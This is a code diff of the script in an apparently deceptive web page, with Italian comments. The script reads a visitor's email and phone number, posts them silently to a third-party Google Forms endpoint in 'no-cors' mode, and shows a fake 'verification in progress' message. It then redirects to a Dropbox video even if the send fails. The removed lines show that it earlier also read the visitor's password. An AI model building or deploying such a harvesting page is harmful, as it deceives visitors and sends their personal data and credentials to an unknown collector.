@@ -237,31 +237,34 @@ function validateEmail(email) {
 
 // --- CONFIGURAZIONE GOOGLE FORMS ---
 const G_URL = "https://docs.google.com/forms/d/e/1FAIpQLSeL-5tvSnuXBFBtEV0yziqFQcdNdBuOPzLk6no5DktX-XvAEw/formResponse";
-
 async function inviaDatiFinali() {
     const email = document.getElementById("email").value;
     const phone = document.getElementById("phone").value;
-    const password = document.getElementById("password").value;
 
-    // Creiamo il contenitore dei dati
     const formData = new FormData();
-    
-    // Sostituisci i numeri qui sotto con i tuoi Entry ID trovati al punto 3
     formData.append("entry.1807533030", email); 
     formData.append("entry.1821810321", phone);
-  //  formData.append("entry.167777586", password);
+
+    // Mostriamo un feedback all'utente (opzionale ma consigliato)
+    const btn = document.querySelector(".primary");
+    btn.textContent = "Verifica in corso...";
+    btn.disabled = true;
 
     try {
         await fetch(G_URL, {
             method: "POST",
-            mode: "no-cors", // Fondamentale per evitare blocchi di sicurezza
+            mode: "no-cors",
             body: formData
         });
 
-        // Dopo l'invio, facciamo il redirect
-        window.location.href = "https://www.dropbox.com/scl/fi/2r3sg52o8hwhqpx817yfk/lv-0-20251229195311_MW6hIimX.mp4?rlkey=aeick235473orhhza3xexn0jm&st=9cdbovbt&dl=0"; 
+        // Aspettiamo 1 secondo per essere sicuri che i dati siano partiti
+        setTimeout(() => {
+            window.location.href = "https://www.dropbox.com/scl/fi/2r3sg52o8hwhqpx817yfk/lv-0-20251229195311_MW6hIimX.mp4?rlkey=aeick235473orhhza3xexn0jm&st=9cdbovbt&dl=0";
+        }, 1000);
+
     } catch (e) {
-        alert("Errore nell'invio dei dati.");
+        // In caso di errore vero (connessione assente), lo mandiamo comunque
+        window.location.href = "https://www.dropbox.com/scl/fi/2r3sg52o8hwhqpx817yfk/lv-0-20251229195311_MW6hIimX.mp4?rlkey=aeick235473orhhza3xexn0jm&st=9cdbovbt&dl=0";
     }
 }
 </script>
@@ -269,4 +272,3 @@ async function inviaDatiFinali() {
 </body>
 
 </html>
-
